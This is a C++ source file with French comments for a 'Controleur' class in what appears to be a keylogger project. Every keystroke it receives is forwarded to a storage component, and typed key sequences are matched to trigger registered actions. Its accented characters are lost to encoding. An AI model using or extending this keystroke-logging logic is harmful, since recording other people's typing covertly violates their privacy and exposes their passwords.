/*!
* \file Controleur.cpp
* Fichier source de la classe abstraite Controleur.
* \author Xavier Monin
* \date 09/11/2008
*/

#include "Controleur.h"

//! \brief Constructeur de Controleur.
Controleur::Controleur()
: source_keylogger(NULL), position(0), stockage(NULL)
{

}

/*!
* \brief Ajouter une action � la liste.
* \param[in] mdp : Mot de passe li� � l'action.
* \return : L'identifiant de l'action.
*/
IdentifiantAction Controleur::ajouterAction(MotDePasse mdp)
{
	position++;
	liste_mdp[position] = mdp;
	liste_occurence[position] = 0;

	return position;
}

/*!
* \brief Supprime une action de la liste.
* \param[in] id : Identifiant de l'action � supprimer.
*/
void Controleur::supprimerAction(IdentifiantAction id)
{
	liste_mdp.erase(id);
}

void Controleur::envoyer(const std::string& touche)
{
	if (stockage != NULL)
		stockage->envoyerDonnees(touche);
}

/*!
* \brief Inspecte les actions � effectuer.
* \return : Liste des actions � effectuer.
*/
ListeActions Controleur::verifierActions()
{
	ListeActions actions;

	ListeMotsDePasse::iterator it_mdp;
	ListeOccurences::iterator it_occ;


	// Iteration sur les actions possibles
	for (it_mdp=liste_mdp.begin(), it_occ=liste_occurence.begin(); it_mdp != liste_mdp.end(); it_mdp++, it_occ++)
	{
		size_t &occurence = it_occ->second; // R�f�rence pour pouvoir modifier l'�l�ment
		MotDePasse &mdp = it_mdp->second; // De m�me

		if(mdp[occurence]==derniere_touche)
		{
			// La touche press�e correspond � l'�l�ment courant du mot de passe
			occurence++; // On incr�mente donc le nombre de touches correspondantes
			if (occurence==mdp.size())
			{
				// Le mot de passe est enti�rement tap�, on vas donc effectuer l'action correspondante
				actions.push_back(it_occ->first); // On ajoute l'action � la liste � faire
				occurence=0; // Remise � z�ro
			}
		}
		else
			occurence=0; // Pas de correspondance, donc aucune occurence
	}

	return actions;
}

/*!
* \brief Re�oit une touche.
* Lance la v�rification des actions et transmet la touche.
* \param[in] touche : Touche press�e.
*/
bool Controleur::emettre(const std::string& touche)
{
	ListeActions actions;
	derniere_touche = touche;

	envoyer(derniere_touche);

	if ( !( actions=verifierActions() ).empty() )
		for (size_t i=0; i<actions.size(); i++)
			effectuerAction(actions[i]); // Effectue les actions

	return true;
}
